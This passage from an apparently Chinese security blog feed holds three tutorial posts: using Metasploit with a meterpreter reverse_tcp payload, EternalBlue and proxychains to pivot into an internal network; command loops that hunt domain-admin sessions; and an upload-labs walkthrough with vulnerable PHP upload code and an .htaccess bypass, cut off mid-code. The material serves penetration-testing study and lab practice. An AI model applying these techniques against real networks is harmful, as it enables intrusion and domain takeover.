alt="在这里插入图片描述"><br>使用那个模块 use 模块名或use 前面的数字都可以<br><img src="https://img-blog.csdnimg.cn/20210503215928377.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210503215943473.png" alt="在这里插入图片描述"><br><strong>1.3使用模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看要设置的参数</span><br>show options<br><span class="hljs-comment">#查看模块详情</span><br>info<br><span class="hljs-comment">#设置载荷  有很多可以自行选择</span><br> <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503220943666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210503221039773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210503221406503.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#运行模块</span><br>run 或者 exploit<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503221232981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210503221825545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>1.4.命令行模式的一些基础操作</strong><br>输入help可以查看支持的操作，但是乱码了，莫慌，可以解决。<br><img src="https://img-blog.csdnimg.cn/20210503221939621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入 chcp 65001<br><img src="https://img-blog.csdnimg.cn/20210503222042627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>乱码没有了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">核心后台脚本：<br><br>bgkill       关闭一个后台的meterpreter脚本<br><br>bglist   列出所有正在运行的后台脚本<br><br>bgrun   将一个meterpreter脚本以后台线程模式运行<br><br>channel   显示或者控制一个活动频道<br><br>close 关闭一个频道<br><br><span class="hljs-built_in">exit</span>终止meterpreter会话<br><br>get_timeouts获得当前会话的<span class="hljs-built_in">timeout</span>值<br><br>getuid查看当前权限<br><br><span class="hljs-built_in">help</span>帮助菜单<br><br>info 显示post模块信息<br><br>irb进入ruby脚本模式<br><br>load加载meterpreter扩展<br><br>migrate   将会话迁移到一个指定PID的进程<br><br>quit 结束meterpreter会话<br><br><span class="hljs-built_in">read</span>从频道中读取数据<br><br>resource运行文件中的命令<br><br>run 执行一个meterpreter脚本或者post模块<br><br>sessions    快速地切换到另一个会话<br><br>background切换到后台<br><br>run checkvm  查看是否是虚拟机<br><br>steal_token 伪造身份<br><br></code></pre></td></tr></table></figure><p>伪造身份：<br><img src="https://img-blog.csdnimg.cn/20210503222319828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2.1实战演示</strong></p><p><img src="https://img-blog.csdnimg.cn/20210503223128117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>通过永恒之蓝拿到跳板机<br><img src="https://img-blog.csdnimg.cn/20210503223229837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>拿到跳板机之后添加路由<br><img src="https://img-blog.csdnimg.cn/20210503223357503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">添加攻击IP添加到目标机路由表中<br><br>也可以 run autoroute -s 10.10.10.0/24<br><br>或者手动添加<br><br>route add 10.10.10.0 255.255.255.0<br></code></pre></td></tr></table></figure><ul><li>接下来设置代理<br><img src="https://img-blog.csdnimg.cn/20210503223655707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><p>接下来用kali上的神奇proxychains</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503223622621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试是否能连内网的机器<br><img src="https://img-blog.csdnimg.cn/20210503223722102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以成功连接<br>通过代理工具开启msf<br><img src="https://img-blog.csdnimg.cn/20210503223753299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来就可以直接搞内网了。实战中可能有多层网段。就需要挂多层代理</p><p>msf中有很多  攻击载荷模块，嗅探模块和后渗透模块。大家后期可以深入的去研究研究。</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查找域管理员进程</title>
    <link href="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/"/>
    <url>/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试中，一个典型的域权限提升过程，通常围绕着收集明文凭据或通过mimikatz提权等方法，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据。如果内网环境非常复杂，渗透测试人员无法立即在拥有权限的系统中获得域管理员进程，那么通常采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到渗透测试的路径。</p><p>现在我们来假设一种情况：渗透测试人员在某个内网环境中获得一个域普通用户的权限，首先通过各种方法获得当前服务器的本地管理员权限，然后分析当前服务器的用户登录列表及会话信息，知道哪些用户登录了这台服务器。如果渗透测试人员通过分析发现，可以获取权限的登录用户都不是域管理员账户，同时没有域管理员组中的用户登录这台服务器，就可以使用另一个账户并寻找账户在内网的哪台机器上具有管理权限，再枚举这台机器上的用户，然后继续进行渗透测试，直至找到一个可以获取域管理员权限的有效路径为止。</p><p><strong>1.1本机检查</strong></p><ul><li>获取域管理员列表</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502214002895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>列出本机的所有进程及进程用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist  /v<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502214113270.png" alt="在这里插入图片描述"><br>列入箭头所指如果为管理员那就可做令牌劫持拿到管理员权限</p><p><strong>1.2 查询域控制器的域用户会话</strong><br>查询域控制器的域用户会话，其原理是：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理员会话的系统列表。</p><ul><li>查询域控制器列表</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br></code></pre></td></tr></table></figure><ul><li>收集域管理员列表<br><img src="https://img-blog.csdnimg.cn/20210502221209320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502221303765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>收集所有活动域的会话列表</li></ul><p>使用netsess.exe查询每个域控制器，收集所有活动域会话列表。netsess.exe是一个很棒的工具，它包含本地windows函数netsessionenum。<br><img src="https://img-blog.csdnimg.cn/20210502221924800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有会话才有信息，否则就没有</p><ul><li>交叉引用域管理员列表与活动会话列表</li></ul><p>对域管理员列表和活动会话列表进行交叉引用，可以确定那些IP地址有活动域令牌。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net localgroup <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br>net localgroup <span class="hljs-string">&quot;Domian Admins&quot;</span> /domain &gt; admins.txt<br></code></pre></td></tr></table></figure><p>然后运行一下脚本，会在当前目录下生成一个文本文件sessions.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FOR /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;null &gt;sessions.txt &amp;&amp; FOR /F %a <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> sessions.txt | @findstr /I %a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503232022719.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210503231928181.png" alt="在这里插入图片描述"><br>这里因为没有会话所以没有内容。</p><p><strong>2.1 查询远程系统中运行的任务</strong><br>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理任务。<br>首先，从Domain Admins组中收集域管理员列表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain &gt; admins.txt<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FOR /F %i <span class="hljs-keyword">in</span> (dcs.txt) DO @<span class="hljs-built_in">echo</span> [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> output.txt | findstr %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found running a process on %i &amp;&amp; pause<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503234751155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2.2 扫描远程系统的NetBIOS信息</strong><br>某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain &gt; admins.txt<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503235329179.png" alt="在这里插入图片描述"><br>使用nbtscan工具，就文件与nbtscan工具置于同一目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503235629887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>参考：<a href="https://blog.csdn.net/weixin_45007073/article/details/114498146">https://blog.csdn.net/weixin_45007073/article/details/114498146</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域管理员信息</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上次靶场练习</title>
    <link href="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>注意：这里的环境要为php5.6以下没有nts的<br><img src="https://img-blog.csdnimg.cn/20210614175336438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>Pass-01</strong><br>直接上传图片码抓包修改后缀即可<br><img src="https://img-blog.csdnimg.cn/20210614175110872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210614175159921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-02</strong><br>同样上传图片码抓包修改后缀即可，比Pass-01多了个对MIME的检测，但对于上传图片码来说就没啥区别<br><strong>Pass-03</strong><br>查看源码<br><img src="https://img-blog.csdnimg.cn/20210614175916801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>后台进行了黑名单限制，但是黑名单不完整，常见的可执行PHP文件的后缀：<br>php2、php3、php5、phtml、pht  当然这个的是配置文件里有才行</p><p><img src="https://img-blog.csdnimg.cn/20210614214736802.png" alt="在这里插入图片描述"></p><p><strong>Pass-04</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //收尾去空<br><br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到这个黑名单黑的很死，但是却漏了htaccess,我们可以上传一个.htaccess的配置文件，从而绕过<br><img src="https://img-blog.csdnimg.cn/20210614215832487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">SetHandler application/x-httpd-php<br><span class="hljs-comment">#就是让所有的文件都当作php文件解析</span><br></code></pre></td></tr></table></figure><p>此时我们在上传一个图片码就行了<br><img src="https://img-blog.csdnimg.cn/20210614220044510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>Pass-05</strong><br>看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span 